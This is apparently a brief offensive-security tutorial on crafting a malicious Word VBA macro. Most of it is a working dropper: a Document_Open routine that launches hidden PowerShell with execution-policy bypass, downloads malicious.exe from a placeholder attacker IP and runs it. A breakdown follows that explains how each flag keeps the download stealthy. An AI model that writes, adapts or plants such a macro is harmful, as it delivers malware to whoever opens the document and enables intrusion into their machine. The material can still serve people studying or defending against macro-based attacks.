Crafting a Malicious VBA Macro

Downloading and executing a payload via PowerShell

Malicious VBA Macro
Private Sub Document_Open()
    Dim objShell As Object
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-WebRequest -Uri http://<YOUR_ATTACKER_IP>/malicious.exe -OutFile C:\Users\Public\malicious.exe; Start-Process C:\Users\Public\malicious.exe\""
End Sub
Code Breakdown

The Document_Open() subroutine ensures the macro runs automatically. It uses WScript.Shell to execute a PowerShell command that downloads and runs the payload.

PowerShell Command Explained

  • 1
    -NoP -NonI: No Profile, Non-Interactive. Prevents loading user profiles and keeps the session non-interactive.
  • 2
    -W Hidden: Window Hidden. Executes PowerShell without displaying a console window.
  • 3
    -Exec Bypass: Execution Bypass. Bypasses the execution policy for the current session.
  • 4
    Invoke-WebRequest: Downloads the payload from the attacker's web server.
  • 5
    Start-Process: Executes the downloaded payload.
Key Takeaway

Malicious VBA macros can leverage PowerShell to download and execute payloads stealthily, making them a potent client-side attack vector.
